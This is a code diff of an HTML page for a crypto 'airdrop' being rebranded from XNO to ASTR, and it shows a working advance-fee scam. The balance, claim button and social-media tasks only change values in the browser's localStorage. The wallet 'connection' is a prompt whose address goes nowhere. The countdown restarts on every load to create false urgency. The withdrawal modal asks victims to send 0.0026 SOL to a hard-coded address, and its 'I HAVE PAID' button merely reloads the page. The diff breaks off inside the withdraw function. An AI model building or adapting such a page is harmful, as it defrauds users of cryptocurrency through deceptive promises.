@@ -3,152 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XNO AIRDROP</title>
+    <title>ASTR AIRDROP</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #0b0e11; color: white; font-family: sans-serif; }
+        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
         .card { background: #181a20; border-radius: 12px; padding: 15px; margin-bottom: 12px; border: 1px solid #2b2f36; }
         .gradient-btn { background: linear-gradient(90deg, #3a86ff, #8338ec); border: none; }
-        .timer-box { border: 1px solid #3a86ff; border-radius: 8px; padding: 10px; background: rgba(58, 134, 255, 0.05); }
-        .task-done { display: none; }
-        .wallet-card { background: #1e2126; border-radius: 10px; padding: 12px; margin-top: 8px; border-left: 4px solid #f3ba2f; }
+        .timer-box { border: 2px solid #3a86ff; border-radius: 10px; padding: 10px; background: rgba(58, 134, 255, 0.1); }
+        .wallet-card { background: #1e2126; border-radius: 10px; padding: 12px; border-left: 4px solid #f3ba2f; }
+        .task-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid #2b2f36; padding-bottom: 8px; }
+        .task-completed { display: none !important; }
     </style>
 </head>
 <body class="p-4 max-w-md mx-auto">
 
-    <div class="text-center my-4">
-        <img src="https://i.ibb.co/3W6nJvG/xno-logo.png" alt="XNO" class="w-20 mx-auto rounded-full border-2 border-blue-500 shadow-lg">
-        <h1 class="text-xl font-bold mt-2 text-blue-400">XNO COIN AIRDROP</h1>
+    <div class="text-center my-6">
+        <img src="https://i.postimg.cc/kR9Z33Zf/image-4.png" alt="ASTR Logo" class="w-24 mx-auto rounded-full border-4 border-blue-500 shadow-xl">
+        <h1 class="text-xl font-black mt-2 text-blue-400 italic">ASTR COIN AIRDROP</h1>
     </div>
 
     <div class="card text-center">
-        <div id="timer" class="timer-box text-lg font-mono font-bold mb-3 text-white">16d : 23h : 59m : 59s</div>
-        <p class="text-gray-400 text-sm">Your Balance</p>
-        <h2 id="balance" class="text-3xl font-bold">0.00 XNO</h2>
-        <button id="claimBtn" onclick="claimWelcome()" class="gradient-btn w-full py-3 mt-3 rounded-lg font-bold">CLAIM 10,000 XNO</button>
+        <p class="text-gray-400 text-xs uppercase mb-2">Airdrop Ending In:</p>
+        <div id="timer" class="timer-box text-xl font-mono font-bold text-white tracking-widest">
+            16d : 23h : 59m : 59s
+        </div>
+    </div>
+
+    <div class="card text-center">
+        <p class="text-gray-400 text-sm">Your ASTR Balance</p>
+        <h2 id="balanceDisplay" class="text-4xl font-black mt-1">0.00 ASTR</h2>
+        <button id="claimBtn" onclick="claimWelcome()" class="gradient-btn w-full py-3 mt-4 rounded-xl font-black text-lg shadow-lg">CLAIM 8,000 ASTR</button>
     </div>
 
     <div class="card">
-        <h3 class="font-bold text-sm text-yellow-500 mb-2 italic">WALLET OPTIONS</h3>
-        <div id="walletDisplay">
+        <h3 class="font-bold text-sm text-yellow-500 mb-3 uppercase italic">Wallet Options</h3>
+        <div id="walletBox">
             <div class="wallet-card flex justify-between items-center">
-                <div class="flex items-center gap-2">
-                    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-5">
-                    <span class="text-sm font-bold">Binance Wallet</span>
+                <div class="flex items-center gap-3">
+                    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-6">
+                    <div>
+                        <p class="text-sm font-bold">Binance Wallet</p>
+                        <p id="walletStatus" class="text-[10px] text-gray-500">Not Connected</p>
+                    </div>
                 </div>
-                <button onclick="connectWallet()" class="bg-blue-600 px-3 py-1 rounded text-xs font-bold">Connect</button>
+                <button id="connBtn" onclick="connectWallet()" class="bg-blue-600 px-4 py-1 rounded-lg text-xs font-bold shadow-md">Connect</button>
             </div>
         </div>
     </div>
 
-    <div id="taskSection" class="card">
-        <h3 class="font-bold text-sm mb-3">TASKS (80 XNO Each)</h3>
-        <div id="task1" class="flex justify-between items-center mb-3 text-sm">
-            <span>Join Telegram Channel 1</span>
-            <a href="https://t.me/XNO_AIRDROP_OFFICIAL" target="_blank" onclick="completeTask(1)" class="text-blue-400 font-bold border border-blue-400 px-3 py-1 rounded">JOIN</a>
+    <div id="taskCard" class="card">
+        <h3 class="font-bold text-sm mb-4 uppercase">Tasks (20 ASTR Each)</h3>
+        
+        <div id="t1" class="task-row">
+            <span class="text-xs">Join Telegram Channel 1</span>
+            <a href="https://t.me/XNO_AIRDROP_OFFICIAL" target="_blank" onclick="completeTask(1)" class="text-blue-400 border border-blue-400 px-4 py-1 rounded-md text-xs font-bold">JOIN</a>
         </div>
-        <div id="task2" class="flex justify-between items-center mb-3 text-sm">
-            <span>Join Telegram Channel 2</span>
-            <a href="https://t.me/+pO1956ctV4JiODg9" target="_blank" onclick="completeTask(2)" class="text-blue-400 font-bold border border-blue-400 px-3 py-1 rounded">JOIN</a>
+
+        <div id="t2" class="task-row">
+            <span class="text-xs">Join Telegram Channel 2</span>
+            <a href="https://t.me/+pO1956ctV4JiODg9" target="_blank" onclick="completeTask(2)" class="text-blue-400 border border-blue-400 px-4 py-1 rounded-md text-xs font-bold">JOIN</a>
         </div>
-        <div id="task3" class="flex justify-between items-center text-sm">
-            <span>Follow on Twitter/X</span>
-            <a href="https://x.com/i/status/2035895387677233355" target="_blank" onclick="completeTask(3)" class="text-blue-400 font-bold border border-blue-400 px-3 py-1 rounded">FOLLOW</a>
+
+        <div id="t3" class="task-row border-none">
+            <span class="text-xs">Follow on Twitter/X</span>
+            <a href="https://x.com/i/status/2035895387677233355" target="_blank" onclick="completeTask(3)" class="text-blue-400 border border-blue-400 px-4 py-1 rounded-md text-xs font-bold">FOLLOW</a>
         </div>
     </div>
 
     <div class="card">
-        <h3 class="font-bold text-sm mb-2">REFER LINK</h3>
-        <div class="flex gap-2">
-            <input type="text" readonly value="https://t.me/XnoAirdropBot?start=user123" class="w-full bg-black border border-gray-700 p-2 rounded text-[10px] text-blue-300">
-            <button class="bg-gray-700 px-3 rounded text-xs font-bold">COPY</button>
+        <h3 class="font-bold text-sm mb-2">Referral Link</h3>
+        <div class="flex gap-2 bg-black p-2 rounded-lg border border-gray-700">
+            <input type="text" readonly value="https://t.me/ASTR_Airdrop_Bot?start=user123" class="w-full bg-transparent text-[10px] text-blue-300 outline-none">
+            <button class="text-blue-500 font-bold text-xs uppercase">Copy</button>
         </div>
-        <p class="text-[10px] text-gray-500 mt-2">+30 XNO per referral</p>
+        <p class="text-[10px] text-gray-500 mt-2 italic text-center">Invite friends and get 18 ASTR per referral</p>
     </div>
 
-    <button onclick="handleWithdraw()" class="w-full py-4 rounded-xl bg-green-600 font-black text-lg shadow-lg mb-8">WITHDRAW</button>
+    <button onclick="handleWithdraw()" class="w-full py-4 rounded-2xl bg-green-600 font-black text-xl shadow-2xl mb-10 tracking-widest uppercase">Withdraw</button>
 
-    <div id="feeModal" class="fixed inset-0 bg-black/90 hidden items-center justify-center p-6 z-50">
-        <div class="bg-gray-800 p-6 rounded-2xl w-full text-center border border-green-500">
-            <h2 class="font-bold mb-4 italic">WITHDRAWAL FEE</h2>
-            <div class="bg-black p-4 rounded-lg mb-4">
-                <p class="text-green-400 font-bold text-xl">0.0026 SOL</p>
-                <p class="text-[10px] text-gray-500 mt-2">ADMIN SOL ADDRESS:</p>
-                <p class="text-[10px] text-blue-400 break-all select-all">6pDb7eYdLUUrrSmKdh5H1FXGTTfE1b4pFhGaYFiuMkG3</p>
+    <div id="feeModal" class="fixed inset-0 bg-black/95 hidden items-center justify-center p-6 z-50">
+        <div class="bg-gray-900 p-6 rounded-3xl w-full border-2 border-green-500 text-center">
+            <h2 class="font-black text-white text-xl mb-4">WITHDRAWAL FEE</h2>
+            <div class="bg-black p-4 rounded-2xl border border-gray-800 mb-6">
+                <p class="text-green-400 font-black text-2xl">0.0026 SOL</p>
+                <div class="h-[1px] bg-gray-800 my-3"></div>
+                <p class="text-[10px] text-gray-500 uppercase mb-1">Send to SOL Address:</p>
+                <p class="text-[11px] text-blue-400 break-all font-mono">6pDb7eYdLUUrrSmKdh5H1FXGTTfE1b4pFhGaYFiuMkG3</p>
             </div>
-            <button onclick="location.reload()" class="bg-blue-600 w-full py-2 rounded font-bold">I HAVE PAID</button>
+            <button onclick="location.reload()" class="bg-blue-600 w-full py-3 rounded-xl font-bold">I HAVE PAID</button>
         </div>
     </div>
 
     <script>
-        // ডাটা সেভ রাখার জন্য LocalStorage ব্যবহার করা হয়েছে
-        let balance = parseFloat(localStorage.getItem('x_bal')) || 0;
-        let claimed = localStorage.getItem('x_clm') === 'true';
-        let tasks = parseInt(localStorage.getItem('x_tsk')) || 0;
+        // Data Management (LocalStorage)
+        // আমরা এখন 'astr_bal' নামে ডাটা সেভ করছি নতুন টোকেনের জন্য
+        let balance = parseFloat(localStorage.getItem('astr_bal')) || 0;
+        let claimed = localStorage.getItem('astr_clm') === 'true';
+        let tasksCount = parseInt(localStorage.getItem('astr_tsk_count')) || 0;
         let isEnded = false;
 
         window.onload = () => {
-            updateUI();
-            if(claimed) {
-                document.getElementById('claimBtn').innerText = "CLAIMED";
-                document.getElementById('claimBtn').disabled = true;
-                document.getElementById('claimBtn').style.opacity = "0.5";
-            }
-            if(tasks === 3) document.getElementById('taskSection').style.display = 'none';
+            refreshUI();
+            checkAirdropStatus();
         };
 
-        function claimWelcome() {
-            if(!claimed) {
-                balance += 10000;
-                claimed = true;
-                localStorage.setItem('x_bal', balance);
-                localStorage.setItem('x_clm', 'true');
-                updateUI();
-                location.reload();
+        function refreshUI() {
+            document.getElementById('balanceDisplay').innerText = balance.toLocaleString() + " ASTR";
+            
+            if (claimed) {
+                let btn = document.getElementById('claimBtn');
+                btn.innerText = "ALREADY CLAIMED";
+                btn.style.opacity = "0.4";
+                btn.disabled = true;
             }
-        }
 
-        function completeTask(id) {
-            let t = document.getElementById('task'+id);
-            if(!t.classList.contains('task-done')) {
-                balance += 80;
-                tasks++;
-                localStorage.setItem('x_bal', balance);
-                localStorage.setItem('x_tsk', tasks);
-                updateUI();
-                t.classList.add('task-done');
-                if(tasks === 3) location.reload();
+            // টাস্ক চেক
+            for(let i=1; i<=3; i++) {
+                if(localStorage.getItem('astr_task_'+i) === 'true') {
+                    document.getElementById('t'+i).classList.add('task-completed');
+                }
             }
-        }
+            if(tasksCount >= 3) {
+                document.getElementById('taskCard').innerHTML = "<p class='text-center text-green-500 font-bold'>✅ ALL TASKS COMPLETED</p>";
+            }
 
-        function connectWallet() {
-            let addr = prompt("Enter your SOL address:");
-            if(addr) {
-                document.getElementById('walletDisplay').innerHTML = `
-                    <div class="wallet-card">
-                        <p class="text-green-500 text-[10px] font-bold">● CONNECTED (BINANCE)</p>
-                        <p class="text-[10px] text-gray-400 truncate">${addr}</p>
-                        <button onclick="location.reload()" class="text-red-500 text-[9px] mt-1 underline">REMOVE</button>
+            // ওয়ালেট চেক
+            let savedWallet = localStorage.getItem('astr_wallet');
+            if(savedWallet) {
+                document.getElementById('walletBox').innerHTML = `
+                    <div class="wallet-card border-l-green-500">
+                        <p class="text-green-500 text-[10px] font-bold uppercase tracking-widest">● Connected (Binance)</p>
+                        <p class="text-[11px] text-gray-400 truncate mt-1">${savedWallet}</p>
+                        <button onclick="removeWallet()" class="text-red-500 text-[10px] mt-2 font-bold underline">REMOVE</button>
                     </div>`;
             }
         }
 
-        function updateUI() {
-            document.getElementById('balance').innerText = balance.toLocaleString() + " XNO";
+        function claimWelcome() {
+            if(!claimed) {
+                balance += 8000; // নতুন ক্লেইম অ্যামাউন্ট ৮০০০
+                localStorage.setItem('astr_bal', balance);
+                localStorage.setItem('astr_clm', 'true');
+                refreshUI();
+            }
         }
 
+        function completeTask(id) {
+            if(localStorage.getItem('astr_task_'+id) !== 'true') {
+                balance += 20; // প্রতি টাস্ক ২০ টোকেন
+                tasksCount += 1;
+                localStorage.setItem('astr_bal', balance);
+                localStorage.setItem('astr_tsk_count', tasksCount);
+                localStorage.setItem('astr_task_'+id, 'true');
+                setTimeout(() => refreshUI(), 500);
+            }
+        }
+
+        function connectWallet() {
+            let addr = prompt("Enter your SOL Address:");
+            if(addr && addr.length > 20) {
+                localStorage.setItem('astr_wallet', addr);
+                refreshUI();
+            }
+        }
+
+        function removeWallet() {
+            localStorage.removeItem('astr_wallet');
+            location.reload();
+        }
+
+        // Timer Logic (১৬ দিন ২৩ ঘণ্টা)
         let target = new Date().getTime() + (16*24*60*60*1000) + (23*60*60*1000) + (59*60*1000);
-        setInterval(() => {
-            let now = new Date().getTime();
-            let d = target - now;
-            if(d < 0) { isEnded = true; document.getElementById("timer").innerText = "ENDED"; return; }
-            let days = Math.floor(d / (1000*60*60*24));
-            let hrs = Math.floor((d % (1000*60*60*24)) / (1000*60*60));
-            let min = Math.floor((d % (1000*60*60)) / (1000*60));
-            let sec = Math.floor((d % (1000*60)) / 1000);
-            document.getElementById("timer").innerText = `${days}d : ${hrs}h : ${min}m : ${sec}s`;
-        }, 1000);
+        function checkAirdropStatus() {
+            setInterval(() => {
+                let now = new Date().getTime();
+                let diff = target - now;
+                if(diff <= 0) {
+                    isEnded = true;
+                    document.getElementById('timer').innerText = "AIRDROP ENDED";
+                    return;
+                }
+                let d = Math.floor(diff / (1000*60*60*24));
+                let h = Math.floor((diff % (1000*60*60*24)) / (1000*60*60));
+                let m = Math.floor((diff % (1000*60*60)) / (1000*60));
+                let s = Math.floor((diff % (1000*60)) / 1000);
+                document.getElementById('timer').innerText = `${d}d : ${h}h : ${m}m : ${sec(s)}s`;
+            }, 1000);
+        }
+        function sec(s) { return s < 10 ? '0'+s : s; }
 
         function handleWithdraw() {
             if(!isEnded) {
